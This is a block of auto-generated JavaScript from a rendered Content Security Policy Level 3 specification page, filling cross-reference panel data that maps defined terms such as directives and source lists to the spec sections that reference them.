        window.dfnpanelData['serialized-csp'] = { "dfnID": "serialized-csp", "url": "#serialized-csp", "dfnText": "serialized CSP", "refSections": [{ "refs": [{ "id": "ref-for-serialized-csp" }], "title": "2.2. Policies" }, { "refs": [{ "id": "ref-for-serialized-csp\u2460" }], "title": "2.3.1. Source Lists" }, { "refs": [{ "id": "ref-for-serialized-csp\u2461" }], "title": "3. \n    Policy Delivery\n  " }, { "refs": [{ "id": "ref-for-serialized-csp\u2462" }], "title": "3.1. \n    The Content-Security-Policy HTTP Response Header Field\n  " }, { "refs": [{ "id": "ref-for-serialized-csp\u2463" }], "title": "3.2. \n    The Content-Security-Policy-Report-Only HTTP Response Header Field\n  " }, { "refs": [{ "id": "ref-for-serialized-csp\u2464" }], "title": "5.3. \n    Obtain the deprecated serialization of violation\n  " }, { "refs": [{ "id": "ref-for-serialized-csp\u2465" }, { "id": "ref-for-serialized-csp\u2466" }], "title": "5.5. \n    Report a violation\n  " }], "external": false };
        window.dfnpanelData['grammardef-serialized-policy'] = { "dfnID": "grammardef-serialized-policy", "url": "#grammardef-serialized-policy", "dfnText": "serialized-policy", "refSections": [{ "refs": [{ "id": "ref-for-grammardef-serialized-policy" }], "title": "2.2. Policies" }, { "refs": [{ "id": "ref-for-grammardef-serialized-policy\u2460" }], "title": "3.1. \n    The Content-Security-Policy HTTP Response Header Field\n  " }, { "refs": [{ "id": "ref-for-grammardef-serialized-policy\u2461" }], "title": "3.2. \n    The Content-Security-Policy-Report-Only HTTP Response Header Field\n  " }], "external": false };
        window.dfnpanelData['abstract-opdef-parse-a-serialized-csp'] = { "dfnID": "abstract-opdef-parse-a-serialized-csp", "url": "#abstract-opdef-parse-a-serialized-csp", "dfnText": "parse a serialized CSP", "refSections": [{ "refs": [{ "id": "ref-for-abstract-opdef-parse-a-serialized-csp" }], "title": "3.1. \n    The Content-Security-Policy HTTP Response Header Field\n  " }, { "refs": [{ "id": "ref-for-abstract-opdef-parse-a-serialized-csp\u2460" }], "title": "3.2. \n    The Content-Security-Policy-Report-Only HTTP Response Header Field\n  " }], "external": false };
        window.dfnpanelData['parse-response-csp'] = { "dfnID": "parse-response-csp", "url": "#parse-response-csp", "dfnText": "2.2.2. \n    Parse response\u2019s Content Security Policies\n  ", "refSections": [{ "refs": [{ "id": "ref-for-parse-response-csp" }], "title": "2.2.2. \n    Parse response\u2019s Content Security Policies\n  " }], "external": false };
        window.dfnpanelData['abstract-opdef-parse-a-responses-content-security-policies'] = { "dfnID": "abstract-opdef-parse-a-responses-content-security-policies", "url": "#abstract-opdef-parse-a-responses-content-security-policies", "dfnText": "parse a response\u2019s Content Security Policies", "refSections": [{ "refs": [{ "id": "ref-for-abstract-opdef-parse-a-responses-content-security-policies" }], "title": "2.2.2. \n    Parse response\u2019s Content Security Policies\n  " }, { "refs": [{ "id": "ref-for-abstract-opdef-parse-a-responses-content-security-policies\u2460" }], "title": "4.2. \n    Integration with HTML\n  " }], "external": false };
        window.dfnpanelData['directives'] = { "dfnID": "directives", "url": "#directives", "dfnText": "directives", "refSections": [{ "refs": [{ "id": "ref-for-directives" }], "title": "2.2. Policies" }, { "refs": [{ "id": "ref-for-directives\u2460" }, { "id": "ref-for-directives\u2461" }], "title": "2.2.1. \n    Parse a serialized CSP\n  " }, { "refs": [{ "id": "ref-for-directives\u2462" }, { "id": "ref-for-directives\u2463" }], "title": "2.3. Directives" }, { "refs": [{ "id": "ref-for-directives\u2464" }], "title": "2.3.1. Source Lists" }, { "refs": [{ "id": "ref-for-directives\u2465" }], "title": "2.4. Violations" }, { "refs": [{ "id": "ref-for-directives\u2466" }], "title": "4.1. \n    Integration with Fetch\n  " }, { "refs": [{ "id": "ref-for-directives\u2467" }, { "id": "ref-for-directives\u2468" }, { "id": "ref-for-directives\u2460\u24ea" }], "title": "4.4.1. \n    EnsureCSPDoesNotBlockStringCompilation(realm, parameterStrings, bodyString, codeString, compilationType, parameterArgs, bodyArg)\n  " }, { "refs": [{ "id": "ref-for-directives\u2460\u2460" }, { "id": "ref-for-directives\u2460\u2461" }, { "id": "ref-for-directives\u2460\u2462" }], "title": "4.5.1. \n  EnsureCSPDoesNotBlockWasmByteCompilationrealm\n" }, { "refs": [{ "id": "ref-for-directives\u2460\u2463" }, { "id": "ref-for-directives\u2460\u2464" }, { "id": "ref-for-directives\u2460\u2465" }], "title": "5.5. \n    Report a violation\n  " }, { "refs": [{ "id": "ref-for-directives\u2460\u2466" }], "title": "6. \n    Content Security Policy Directives\n  " }, { "refs": [{ "id": "ref-for-directives\u2460\u2467" }], "title": "6.1.1.1. \n    child-src Pre-request check\n  " }, { "refs": [{ "id": "ref-for-directives\u2460\u2468" }], "title": "6.1.1.2. \n    child-src Post-request check\n  " }, { "refs": [{ "id": "ref-for-directives\u2461\u24ea" }], "title": "6.1.3.1. \n    default-src Pre-request check\n  " }, { "refs": [{ "id": "ref-for-directives\u2461\u2460" }], "title": "6.1.3.2. \n    default-src Post-request check\n  " }, { "refs": [{ "id": "ref-for-directives\u2461\u2461" }], "title": "6.1.3.3. \n    default-src Inline Check\n  " }, { "refs": [{ "id": "ref-for-directives\u2461\u2462" }, { "id": "ref-for-directives\u2461\u2463" }], "title": "6.3.1.1. \n    Is base allowed for document?\n  " }, { "refs": [{ "id": "ref-for-directives\u2461\u2464" }, { "id": "ref-for-directives\u2461\u2465" }], "title": "6.4.2.1. \n    frame-ancestors Navigation Response Check\n  " }, { "refs": [{ "id": "ref-for-directives\u2461\u2466" }], "title": "6.4.2.2. \n    Relation to ``X-Frame-Options``\n  " }, { "refs": [{ "id": "ref-for-directives\u2461\u2467" }], "title": "6.7.1.1. \n    Script directives pre-request check\n  " }, { "refs": [{ "id": "ref-for-directives\u2461\u2468" }], "title": "6.7.1.2. \n    Script directives post-request check\n  " }, { "refs": [{ "id": "ref-for-directives\u2462\u24ea" }], "title": "6.7.2.1. \n    Does request violate policy?\n  " }, { "refs": [{ "id": "ref-for-directives\u2462\u2460" }, { "id": "ref-for-directives\u2462\u2461" }], "title": "6.7.2.2. \n    Does resource hint request violate policy?\n  " }, { "refs": [{ "id": "ref-for-directives\u2462\u2462" }], "title": "6.7.2.5. \n    Does request match source list?\n  " }, { "refs": [{ "id": "ref-for-directives\u2462\u2463" }], "title": "6.7.2.6. \n    Does response to request match source list?\n  " }, { "refs": [{ "id": "ref-for-directives\u2462\u2464" }, { "id": "ref-for-directives\u2462\u2465" }], "title": "6.8.3. \n    Get fetch directive fallback list\n  " }], "external": false };
        window.dfnpanelData['directive-name'] = { "dfnID": "directive-name", "url": "#directive-name", "dfnText": "name", "refSections": [{ "refs": [{ "id": "ref-for-directive-name" }, { "id": "ref-for-directive-name\u2460" }], "title": "2.2.1. \n    Parse a serialized CSP\n  " }, { "refs": [{ "id": "ref-for-directive-name\u2461" }], "title": "2.3. Directives" }, { "refs": [{ "id": "ref-for-directive-name\u2462" }], "title": "4.2.4. \n    Should navigation request of type be blocked\n    by Content Security Policy?\n  " }, { "refs": [{ "id": "ref-for-directive-name\u2463" }, { "id": "ref-for-directive-name\u2464" }], "title": "4.2.5. \n    Should navigation response to navigation request of type\n    in target be blocked by Content Security Policy?\n  " }, { "refs": [{ "id": "ref-for-directive-name\u2465" }], "title": "4.3.1. \n    Should RTC connections be blocked for global?\n  " }, { "refs": [{ "id": "ref-for-directive-name\u2466" }, { "id": "ref-for-directive-name\u2467" }], "title": "4.4.1. \n    EnsureCSPDoesNotBlockStringCompilation(realm, parameterStrings, bodyString, codeString, compilationType, parameterArgs, bodyArg)\n  " }, { "refs": [{ "id": "ref-for-directive-name\u2468" }, { "id": "ref-for-directive-name\u2460\u24ea" }], "title": "4.5.1. \n  EnsureCSPDoesNotBlockWasmByteCompilationrealm\n" }, { "refs": [{ "id": "ref-for-directive-name\u2460\u2460" }], "title": "6.1.1.1. \n    child-src Pre-request check\n  " }, { "refs": [{ "id": "ref-for-directive-name\u2460\u2461" }], "title": "6.1.1.2. \n    child-src Post-request check\n  " }, { "refs": [{ "id": "ref-for-directive-name\u2460\u2462" }], "title": "6.1.3.1. \n    default-src Pre-request check\n  " }, { "refs": [{ "id": "ref-for-directive-name\u2460\u2463" }], "title": "6.1.3.2. \n    default-src Post-request check\n  " }, { "refs": [{ "id": "ref-for-directive-name\u2460\u2464" }], "title": "6.1.3.3. \n    default-src Inline Check\n  " }, { "refs": [{ "id": "ref-for-directive-name\u2460\u2465" }], "title": "6.3.1.1. \n    Is base allowed for document?\n  " }, { "refs": [{ "id": "ref-for-directive-name\u2460\u2466" }], "title": "6.7.2.2. \n    Does resource hint request violate policy?\n  " }, { "refs": [{ "id": "ref-for-directive-name\u2460\u2467" }], "title": "6.8.1. \n    Get the effective directive for request\n  " }, { "refs": [{ "id": "ref-for-directive-name\u2460\u2468" }], "title": "6.8.2. \n    Get the effective directive for inline checks\n  " }, { "refs": [{ "id": "ref-for-directive-name\u2461\u24ea" }], "title": "6.8.4. \n    Should fetch directive execute\n  " }], "external": false };
        window.dfnpanelData['directive-value'] = { "dfnID": "directive-value", "url": "#directive-value", "dfnText": "value", "refSections": [{ "refs": [{ "id": "ref-for-directive-value" }], "title": "2.2.1. \n    Parse a serialized CSP\n  " }, { "refs": [{ "id": "ref-for-directive-value\u2460" }, { "id": "ref-for-directive-value\u2461" }], "title": "2.3. Directives" }, { "refs": [{ "id": "ref-for-directive-value\u2462" }], "title": "2.3.1. Source Lists" }, { "refs": [{ "id": "ref-for-directive-value\u2463" }], "title": "4.2.3. \n    Should element\u2019s inline type behavior be blocked by Content Security Policy?\n  " }, { "refs": [{ "id": "ref-for-directive-value\u2464" }, { "id": "ref-for-directive-value\u2465" }], "title": "4.4.1. \n    EnsureCSPDoesNotBlockStringCompilation(realm, parameterStrings, bodyString, codeString, compilationType, parameterArgs, bodyArg)\n  " }, { "refs": [{ "id": "ref-for-directive-value\u2466" }, { "id": "ref-for-directive-value\u2467" }], "title": "4.5.1. \n  EnsureCSPDoesNotBlockWasmByteCompilationrealm\n" }, { "refs": [{ "id": "ref-for-directive-value\u2468" }, { "id": "ref-for-directive-value\u2460\u24ea" }], "title": "5.5. \n    Report a violation\n  " }, { "refs": [{ "id": "ref-for-directive-value\u2460\u2460" }], "title": "6.1.1.1. \n    child-src Pre-request check\n  " }, { "refs": [{ "id": "ref-for-directive-value\u2460\u2461" }], "title": "6.1.1.2. \n    child-src Post-request check\n  " }, { "refs": [{ "id": "ref-for-directive-value\u2460\u2462" }], "title": "6.1.2.1. \n    connect-src Pre-request check\n  " }, { "refs": [{ "id": "ref-for-directive-value\u2460\u2463" }], "title": "6.1.2.2. \n    connect-src Post-request check\n  " }, { "refs": [{ "id": "ref-for-directive-value\u2460\u2464" }], "title": "6.1.3.1. \n    default-src Pre-request check\n  " }, { "refs": [{ "id": "ref-for-directive-value\u2460\u2465" }], "title": "6.1.3.2. \n    default-src Post-request check\n  " }, { "refs": [{ "id": "ref-for-directive-value\u2460\u2466" }], "title": "6.1.3.3. \n    default-src Inline Check\n  " }, { "refs": [{ "id": "ref-for-directive-value\u2460\u2467" }], "title": "6.1.4.1. \n    font-src Pre-request check\n  " }, { "refs": [{ "id": "ref-for-directive-value\u2460\u2468" }], "title": "6.1.4.2. \n    font-src Post-request check\n  " }, { "refs": [{ "id": "ref-for-directive-value\u2461\u24ea" }], "title": "6.1.5.1. \n    frame-src Pre-request check\n  " }, { "refs": [{ "id": "ref-for-directive-value\u2461\u2460" }], "title": "6.1.5.2. \n    frame-src Post-request check\n  " }, { "refs": [{ "id": "ref-for-directive-value\u2461\u2461" }], "title": "6.1.6.1. \n    img-src Pre-request check\n  " }, { "refs": [{ "id": "ref-for-directive-value\u2461\u2462" }], "title": "6.1.6.2. \n    img-src Post-request check\n  " }, { "refs": [{ "id": "ref-for-directive-value\u2461\u2463" }], "title": "6.1.7.1. \n    manifest-src Pre-request check\n  " }, { "refs": [{ "id": "ref-for-directive-value\u2461\u2464" }], "title": "6.1.7.2. \n    manifest-src Post-request check\n  " }, { "refs": [{ "id": "ref-for-directive-value\u2461\u2465" }], "title": "6.1.8.1. \n    media-src Pre-request check\n  " }, { "refs": [{ "id": "ref-for-directive-value\u2461\u2466" }], "title": "6.1.8.2. \n    media-src Post-request check\n  " }, { "refs": [{ "id": "ref-for-directive-value\u2461\u2467" }], "title": "6.1.9.1. \n    object-src Pre-request check\n  " }, { "refs": [{ "id": "ref-for-directive-value\u2461\u2468" }], "title": "6.1.9.2. \n    object-src Post-request check\n  " }, { "refs": [{ "id": "ref-for-directive-value\u2462\u24ea" }], "title": "6.1.10.3. \n    script-src Inline Check\n  " }, { "refs": [{ "id": "ref-for-directive-value\u2462\u2460" }], "title": "6.1.11. script-src-elem" }, { "refs": [{ "id": "ref-for-directive-value\u2462\u2461" }], "title": "6.1.11.3. \n    script-src-elem Inline Check\n  " }, { "refs": [{ "id": "ref-for-directive-value\u2462\u2462" }], "title": "6.1.12.1. \n    script-src-attr Inline Check\n  " }, { "refs": [{ "id": "ref-for-directive-value\u2462\u2463" }, { "id": "ref-for-directive-value\u2462\u2464" }], "title": "6.1.13.1. \n    style-src Pre-request Check\n  " }, { "refs": [{ "id": "ref-for-directive-value\u2462\u2465" }, { "id": "ref-for-directive-value\u2462\u2466" }], "title": "6.1.13.2. \n    style-src Post-request Check\n  " }, { "refs": [{ "id": "ref-for-directive-value\u2462\u2467" }], "title": "6.1.13.3. \n    style-src Inline Check\n  " }, { "refs": [{ "id": "ref-for-directive-value\u2462\u2468" }, { "id": "ref-for-directive-value\u2463\u24ea" }], "title": "6.1.14.1. \n    style-src-elem Pre-request Check\n  " }, { "refs": [{ "id": "ref-for-directive-value\u2463\u2460" }, { "id": "ref-for-directive-value\u2463\u2461" }], "title": "6.1.14.2. \n    style-src-elem Post-request Check\n  " }, { "refs": [{ "id": "ref-for-directive-value\u2463\u2462" }], "title": "6.1.14.3. \n    style-src-elem Inline Check\n  " }, { "refs": [{ "id": "ref-for-directive-value\u2463\u2463" }], "title": "6.1.15.1. \n    style-src-attr Inline Check\n  " }, { "refs": [{ "id": "ref-for-directive-value\u2463\u2464" }], "title": "6.2.1.1. \n    webrtc Pre-connect Check\n  " }, { "refs": [{ "id": "ref-for-directive-value\u2463\u2465" }], "title": "6.2.2.1. \n    worker-src Pre-request Check\n  " }, { "refs": [{ "id": "ref-for-directive-value\u2463\u2466" }], "title": "6.2.2.2. \n    worker-src Post-request Check\n  " }, { "refs": [{ "id": "ref-for-directive-value\u2463\u2467" }], "title": "6.3.1.1. \n    Is base allowed for document?\n  " }, { "refs": [{ "id": "ref-for-directive-value\u2463\u2468" }], "title": "6.3.2.1. \n    sandbox Initialization\n  " }, { "refs": [{ "id": "ref-for-directive-value\u2464\u24ea" }], "title": "6.4.1.1. \n    form-action Pre-Navigation Check\n  " }, { "refs": [{ "id": "ref-for-directive-value\u2464\u2460" }], "title": "6.4.2.1. \n    frame-ancestors Navigation Response Check\n  " }, { "refs": [{ "id": "ref-for-directive-value\u2464\u2461" }, { "id": "ref-for-directive-value\u2464\u2462" }, { "id": "ref-for-directive-value\u2464\u2463" }, { "id": "ref-for-directive-value\u2464\u2464" }], "title": "6.7.1.1. \n    Script directives pre-request check\n  " }, { "refs": [{ "id": "ref-for-directive-value\u2464\u2465" }, { "id": "ref-for-directive-value\u2464\u2466" }, { "id": "ref-for-directive-value\u2464\u2467" }, { "id": "ref-for-directive-value\u2464\u2468" }], "title": "6.7.1.2. \n    Script directives post-request check\n  " }], "external": false };
        window.dfnpanelData['serialized-directive'] = { "dfnID": "serialized-directive", "url": "#serialized-directive", "dfnText": "serialized directive", "refSections": [{ "refs": [{ "id": "ref-for-serialized-directive" }], "title": "2.2. Policies" }], "external": false };
        window.dfnpanelData['grammardef-serialized-directive'] = { "dfnID": "grammardef-serialized-directive", "url": "#grammardef-serialized-directive", "dfnText": "serialized-directive", "refSections": [{ "refs": [{ "id": "ref-for-grammardef-serialized-directive" }, { "id": "ref-for-grammardef-serialized-directive\u2460" }], "title": "2.2. Policies" }], "external": false };
        window.dfnpanelData['grammardef-directive-name'] = { "dfnID": "grammardef-directive-name", "url": "#grammardef-directive-name", "dfnText": "directive-name", "refSections": [{ "refs": [{ "id": "ref-for-grammardef-directive-name" }], "title": "2.3. Directives" }], "external": false };
        window.dfnpanelData['grammardef-directive-value'] = { "dfnID": "grammardef-directive-value", "url": "#grammardef-directive-value", "dfnText": "directive-value", "refSections": [{ "refs": [{ "id": "ref-for-grammardef-directive-value" }], "title": "2.3. Directives" }], "external": false };
        window.dfnpanelData['directive-pre-request-check'] = { "dfnID": "directive-pre-request-check", "url": "#directive-pre-request-check", "dfnText": "pre-request check", "refSections": [{ "refs": [{ "id": "ref-for-directive-pre-request-check" }], "title": "4.1. \n    Integration with Fetch\n  " }, { "refs": [{ "id": "ref-for-directive-pre-request-check\u2460" }, { "id": "ref-for-directive-pre-request-check\u2461" }], "title": "6.1.1.1. \n    child-src Pre-request check\n  " }, { "refs": [{ "id": "ref-for-directive-pre-request-check\u2462" }], "title": "6.1.2.1. \n    connect-src Pre-request check\n  " }, { "refs": [{ "id": "ref-for-directive-pre-request-check\u2463" }, { "id": "ref-for-directive-pre-request-check\u2464" }], "title": "6.1.3.1. \n    default-src Pre-request check\n  " }, { "refs": [{ "id": "ref-for-directive-pre-request-check\u2465" }], "title": "6.1.4.1. \n    font-src Pre-request check\n  " }, { "refs": [{ "id": "ref-for-directive-pre-request-check\u2466" }], "title": "6.1.5.1. \n    frame-src Pre-request check\n  " }, { "refs": [{ "id": "ref-for-directive-pre-request-check\u2467" }], "title": "6.1.6.1. \n    img-src Pre-request check\n  " }, { "refs": [{ "id": "ref-for-directive-pre-request-check\u2468" }], "title": "6.1.7.1. \n    manifest-src Pre-request check\n  " }, { "refs": [{ "id": "ref-for-directive-pre-request-check\u2460\u24ea" }], "title": "6.1.8.1. \n    media-src Pre-request check\n  " }, { "refs": [{ "id": "ref-for-directive-pre-request-check\u2460\u2460" }], "title": "6.1.9.1. \n    object-src Pre-request check\n  " }, { "refs": [{ "id": "ref-for-directive-pre-request-check\u2460\u2461" }], "title": "6.1.10.1. \n    script-src Pre-request check\n  " }, { "refs": [{ "id": "ref-for-directive-pre-request-check\u2460\u2462" }], "title": "6.1.11.1. \n    script-src-elem Pre-request check\n  " }, { "refs": [{ "id": "ref-for-directive-pre-request-check\u2460\u2463" }], "title": "6.1.13.1. \n    style-src Pre-request Check\n  " }, { "refs": [{ "id": "ref-for-directive-pre-request-check\u2460\u2464" }], "title": "6.1.14.1. \n    style-src-elem Pre-request Check\n  " }, { "refs": [{ "id": "ref-for-directive-pre-request-check\u2460\u2465" }], "title": "6.2.2.1. \n    worker-src Pre-request Check\n  " }, { "refs": [{ "id": "ref-for-directive-pre-request-check\u2460\u2466" }], "title": "6.6. \n    Directives Defined in Other Documents\n  " }, { "refs": [{ "id": "ref-for-directive-pre-request-check\u2460\u2467" }], "title": "6.7.2.1. \n    Does request violate policy?\n  " }, { "refs": [{ "id": "ref-for-directive-pre-request-check\u2460\u2468" }], "title": "6.7.2.2. \n    Does resource hint request violate policy?\n  " }, { "refs": [{ "id": "ref-for-directive-pre-request-check\u2461\u24ea" }], "title": "6.7.2.5. \n    Does request match source list?\n  " }], "external": false };
        window.dfnpanelData['directive-post-request-check'] = { "dfnID": "directive-post-request-check", "url": "#directive-post-request-check", "dfnText": "post-request check", "refSections": [{ "refs": [{ "id": "ref-for-directive-post-request-check" }], "title": "4.1. \n    Integration with Fetch\n  " }, { "refs": [{ "id": "ref-for-directive-post-request-check\u2460" }], "title": "4.1.3. \n    Should response to request be blocked by Content Security Policy?\n  " }, { "refs": [{ "id": "ref-for-directive-post-request-check\u2461" }, { "id": "ref-for-directive-post-request-check\u2462" }], "title": "6.1.1.2. \n    child-src Post-request check\n  " }, { "refs": [{ "id": "ref-for-directive-post-request-check\u2463" }], "title": "6.1.2.2. \n    connect-src Post-request check\n  " }, { "refs": [{ "id": "ref-for-directive-post-request-check\u2464" }, { "id": "ref-for-directive-post-request-check\u2465" }], "title": "6.1.3.2. \n    default-src Post-request check\n  " }, { "refs": [{ "id": "ref-for-directive-post-request-check\u2466" }], "title": "6.1.4.2. \n    font-src Post-request check\n  " }, { "refs": [{ "id": "ref-for-directive-post-request-check\u2467" }], "title": "6.1.5.2. \n    frame-src Post-request check\n  " }, { "refs": [{ "id": "ref-for-directive-post-request-check\u2468" }], "title": "6.1.6.2. \n    img-src Post-request check\n  " }, { "refs": [{ "id": "ref-for-directive-post-request-check\u2460\u24ea" }], "title": "6.1.7.2. \n    manifest-src Post-request check\n  " }, { "refs": [{ "id": "ref-for-directive-post-request-check\u2460\u2460" }], "title": "6.1.8.2. \n    media-src Post-request check\n  " }, { "refs": [{ "id": "ref-for-directive-post-request-check\u2460\u2461" }], "title": "6.1.9.2. \n    object-src Post-request check\n  " }, { "refs": [{ "id": "ref-for-directive-post-request-check\u2460\u2462" }], "title": "6.1.10.2. \n    script-src Post-request check\n  " }, { "refs": [{ "id": "ref-for-directive-post-request-check\u2460\u2463" }], "title": "6.1.11.2. \n    script-src-elem Post-request check\n  " }, { "refs": [{ "id": "ref-for-directive-post-request-check\u2460\u2464" }], "title": "6.1.13.2. \n    style-src Post-request Check\n  " }, { "refs": [{ "id": "ref-for-directive-post-request-check\u2460\u2465" }], "title": "6.1.14.2. \n    style-src-elem Post-request Check\n  " }, { "refs": [{ "id": "ref-for-directive-post-request-check\u2460\u2466" }], "title": "6.2.2.2. \n    worker-src Post-request Check\n  " }, { "refs": [{ "id": "ref-for-directive-post-request-check\u2460\u2467" }], "title": "6.6. \n    Directives Defined in Other Documents\n  " }, { "refs": [{ "id": "ref-for-directive-post-request-check\u2460\u2468" }], "title": "6.7.1.2. \n    Script directives post-request check\n  " }, { "refs": [{ "id": "ref-for-directive-post-request-check\u2461\u24ea" }], "title": "6.7.2.6. \n    Does response to request match source list?\n  " }], "external": false };
        window.dfnpanelData['directive-inline-check'] = { "dfnID": "directive-inline-check", "url": "#directive-inline-check", "dfnText": "inline check", "refSections": [{ "refs": [{ "id": "ref-for-directive-inline-check" }], "title": "4.2.3. \n    Should element\u2019s inline type behavior be blocked by Content Security Policy?\n  " }, { "refs": [{ "id": "ref-for-directive-inline-check\u2460" }], "title": "4.2.4. \n    Should navigation request of type be blocked\n    by Content Security Policy?\n  " }, { "refs": [{ "id": "ref-for-directive-inline-check\u2461" }, { "id": "ref-for-directive-inline-check\u2462" }], "title": "6.1.3.3. \n    default-src Inline Check\n  " }, { "refs": [{ "id": "ref-for-directive-inline-check\u2463" }], "title": "6.1.10.3. \n    script-src Inline Check\n  " }, { "refs": [{ "id": "ref-for-directive-inline-check\u2464" }], "title": "6.1.11.3. \n    script-src-elem Inline Check\n  " }, { "refs": [{ "id": "ref-for-directive-inline-check\u2465" }], "title": "6.1.12.1. \n    script-src-attr Inline Check\n  " }, { "refs": [{ "id": "ref-for-directive-inline-check\u2466" }], "title": "6.1.13.3. \n    style-src Inline Check\n  " }, { "refs": [{ "id": "ref-for-directive-inline-check\u2467" }], "title": "6.1.14.3. \n    style-src-elem Inline Check\n  " }, { "refs": [{ "id": "ref-for-directive-inline-check\u2468" }], "title": "6.1.15.1. \n    style-src-attr Inline Check\n  " }], "external": false };
        window.dfnpanelData['directive-initialization'] = { "dfnID": "directive-initialization", "url": "#directive-initialization", "dfnText": "initialization", "refSections": [{ "refs": [{ "id": "ref-for-directive-initialization" }], "title": "4.2.1. \n    Run CSP initialization for a Document\n  " }, { "refs": [{ "id": "ref-for-directive-initialization\u2460" }], "title": "4.2.6. \n    Run CSP initialization for a global object\n  " }, { "refs": [{ "id": "ref-for-directive-initialization\u2461" }], "title": "6.1.13.3. \n    style-src Inline Check\n  " }, { "refs": [{ "id": "ref-for-directive-initialization\u2462" }], "title": "6.3.2.1. \n    sandbox Initialization\n  " }, { "refs": [{ "id": "ref-for-directive-initialization\u2463" }], "title": "6.6. \n    Directives Defined in Other Documents\n  " }], "external": false };
        window.dfnpanelData['directive-pre-navigation-check'] = { "dfnID": "directive-pre-navigation-check", "url": "#directive-pre-navigation-check", "dfnText": "pre-navigation check", "refSections": [{ "refs": [{ "id": "ref-for-directive-pre-navigation-check" }], "title": "4.2.4. \n    Should navigation request of type be blocked\n    by Content Security Policy?\n  " }, { "refs": [{ "id": "ref-for-directive-pre-navigation-check\u2460" }], "title": "6.4.1.1. \n    form-action Pre-Navigation Check\n  " }], "external": false };
        window.dfnpanelData['directive-navigation-response-check'] = { "dfnID": "directive-navigation-response-check", "url": "#directive-navigation-response-check", "dfnText": "navigation response check", "refSections": [{ "refs": [{ "id": "ref-for-directive-navigation-response-check" }, { "id": "ref-for-directive-navigation-response-check\u2460" }], "title": "4.2.5. \n    Should navigation response to navigation request of type\n    in target be blocked by Content Security Policy?\n  " }, { "refs": [{ "id": "ref-for-directive-navigation-response-check\u2461" }], "title": "6.4.2.1. \n    frame-ancestors Navigation Response Check\n  " }], "external": false };
        window.dfnpanelData['directive-webrtc-pre-connect-check'] = { "dfnID": "directive-webrtc-pre-connect-check", "url": "#directive-webrtc-pre-connect-check", "dfnText": "webrtc pre-connect check", "refSections": [{ "refs": [{ "id": "ref-for-directive-webrtc-pre-connect-check" }], "title": "4.3.1. \n    Should RTC connections be blocked for global?\n  " }, { "refs": [{ "id": "ref-for-directive-webrtc-pre-connect-check\u2460" }], "title": "6.2.1.1. \n    webrtc Pre-connect Check\n  " }], "external": false };
        window.dfnpanelData['source-lists'] = { "dfnID": "source-lists", "url": "#source-lists", "dfnText": "source lists", "refSections": [{ "refs": [{ "id": "ref-for-source-lists" }], "title": "6.1.1. child-src" }, { "refs": [{ "id": "ref-for-source-lists\u2460" }], "title": "6.1.2. connect-src" }, { "refs": [{ "id": "ref-for-source-lists\u2461" }, { "id": "ref-for-source-lists\u2462" }], "title": "6.1.3. default-src" }, { "refs": [{ "id": "ref-for-source-lists\u2463" }], "title": "6.1.4. font-src" }, { "refs": [{ "id": "ref-for-source-lists\u2464" }], "title": "6.1.5. frame-src" }, { "refs": [{ "id": "ref-for-source-lists\u2465" }], "title": "6.1.6. img-src" }, { "refs": [{ "id": "ref-for-source-lists\u2466" }], "title": "6.1.7. manifest-src" }, { "refs": [{ "id": "ref-for-source-lists\u2467" }], "title": "6.1.8. media-src" }, { "refs": [{ "id": "ref-for-source-lists\u2468" }], "title": "6.1.9. object-src" }, { "refs": [{ "id": "ref-for-source-lists\u2460\u24ea" }], "title": "6.2.2. worker-src" }, { "refs": [{ "id": "ref-for-source-lists\u2460\u2460" }], "title": "6.4.2. frame-ancestors" }, { "refs": [{ "id": "ref-for-source-lists\u2460\u2461" }], "title": "6.7.2.3. \n    Does nonce match source list?\n  " }, { "refs": [{ "id": "ref-for-source-lists\u2460\u2462" }], "title": "6.7.2.4. \n    Does integrity metadata match source list?\n  " }, { "refs": [{ "id": "ref-for-source-lists\u2460\u2463" }], "title": "6.7.2.5. \n    Does request match source list?\n  " }, { "refs": [{ "id": "ref-for-source-lists\u2460\u2464" }], "title": "6.7.2.6. \n    Does response to request match source list?\n  " }, { "refs": [{ "id": "ref-for-source-lists\u2460\u2465" }], "title": "6.7.2.7. \n    Does url match source list in origin with redirect count?\n  " }, { "refs": [{ "id": "ref-for-source-lists\u2460\u2466" }, { "id": "ref-for-source-lists\u2460\u2467" }, { "id": "ref-for-source-lists\u2460\u2468" }, { "id": "ref-for-source-lists\u2461\u24ea" }, { "id": "ref-for-source-lists\u2461\u2460" }], "title": "6.7.3.2. \n    Does a source list allow all inline behavior for type?\n  " }, { "refs": [{ "id": "ref-for-source-lists\u2461\u2461" }], "title": "6.7.3.3. \n    Does element match source list for type and source?\n  " }], "external": false };
        window.dfnpanelData['source-expression'] = { "dfnID": "source-expression", "url": "#source-expression", "dfnText": "source\n  expression", "refSections": [{ "refs": [{ "id": "ref-for-source-expression" }], "title": "1.3. Changes from Level 2" }, { "refs": [{ "id": "ref-for-source-expression\u2460" }], "title": "2.3.1. Source Lists" }, { "refs": [{ "id": "ref-for-source-expression\u2461" }], "title": "4.4.1. \n    EnsureCSPDoesNotBlockStringCompilation(realm, parameterStrings, bodyString, codeString, compilationType, parameterArgs, bodyArg)\n  " }, { "refs": [{ "id": "ref-for-source-expression\u2462" }, { "id": "ref-for-source-expression\u2463" }], "title": "4.5.1. \n  EnsureCSPDoesNotBlockWasmByteCompilationrealm\n" }, { "refs": [{ "id": "ref-for-source-expression\u2464" }], "title": "6.7.1.1. \n    Script directives pre-request check\n  " }, { "refs": [{ "id": "ref-for-source-expression\u2465" }, { "id": "ref-for-source-expression\u2466" }], "title": "6.7.2.4. \n    Does integrity metadata match source list?\n  " }, { "refs": [{ "id": "ref-for-source-expression\u2467" }], "title": "6.7.2.8. \n    Does url match expression in origin with redirect count?\n  " }, { "refs": [{ "id": "ref-for-source-expression\u2468" }], "title": "8.4. \n      Allowing external JavaScript via hashes\n    " }], "external": false };
